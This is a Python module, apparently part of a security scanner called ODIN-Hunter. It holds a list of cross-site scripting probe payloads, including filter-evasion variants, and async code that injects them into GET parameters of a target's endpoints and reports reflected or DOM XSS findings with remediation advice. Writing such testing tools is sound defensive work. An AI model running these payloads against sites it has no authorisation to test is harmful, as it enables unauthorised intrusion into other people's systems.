"""
ODIN-Hunter | XSS Tester
Tests for Cross-Site Scripting vulnerabilities
"""

import aiohttp
import asyncio
import re

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
    "<body onload=alert(1)>",
    '"><img src=x onerror=alert(1)>',
    "<iframe src=javascript:alert(1)>",
    "';alert(1)//",
    '";alert(1)//',
    "<ScRiPt>alert(1)</ScRiPt>",
    "<%2Fscript><script>alert(1)</script>",
    "<input onfocus=alert(1) autofocus>",
    "<details open ontoggle=alert(1)>",
]

ODIN_CANARY = "ODIN_XSS_7x9z"

class XSSTester:
    def __init__(self):
        self.timeout = aiohttp.ClientTimeout(total=10)

    async def test(self, target: str, endpoints: list) -> list:
        """Test endpoints for XSS"""
        findings = []
        base_url = f"https://{target}"

        async with aiohttp.ClientSession(timeout=self.timeout) as session:
            tasks = []
            for ep in endpoints:
                path = ep.get("path", "")
                if any(skip in path for skip in [".css", ".js", ".png", ".jpg", ".gif"]):
                    continue
                url = f"{base_url}{path}"
                tasks.append(self._test_endpoint(session, target, url))

            results = await asyncio.gather(*tasks, return_exceptions=True)
            for result in results:
                if isinstance(result, dict):
                    findings.append(result)

        if findings:
            print(f"[XSSTester] 🚨 {len(findings)} XSS findings on {target}")
        return findings

    async def _test_endpoint(self, session, target: str, url: str) -> dict:
        """Test an endpoint for reflected XSS"""
        for payload in XSS_PAYLOADS[:6]:
            try:
                # Test GET params
                test_url = f"{url}?q={payload}&search={payload}&name={payload}"
                async with session.get(test_url, ssl=False, allow_redirects=False) as resp:
                    body = await resp.text(errors="ignore")
                    # Check if payload is reflected unencoded
                    if payload in body and "<script>" in payload.lower():
                        return {
                            "target": target,
                            "type": "xss",
                            "title": "Reflected XSS",
                            "severity": "high",
                            "description": f"Reflected XSS found at {url}. Input is reflected without encoding.",
                            "proof": {
                                "url": test_url,
                                "payload": payload,
                                "reflected": True
                            },
                            "confidence": 0.80,
                            "remediation": "Encode all user input before rendering in HTML context"
                        }

                    # Check for DOM XSS indicators
                    if "document.write" in body and payload in body:
                        return {
                            "target": target,
                            "type": "dom_xss",
                            "title": "Potential DOM XSS",
                            "severity": "high",
                            "description": f"Potential DOM XSS at {url} — document.write with user input.",
                            "proof": {"url": test_url, "payload": payload},
                            "confidence": 0.65,
                            "remediation": "Avoid document.write; use safe DOM APIs"
                        }
            except Exception:
                pass
        return None
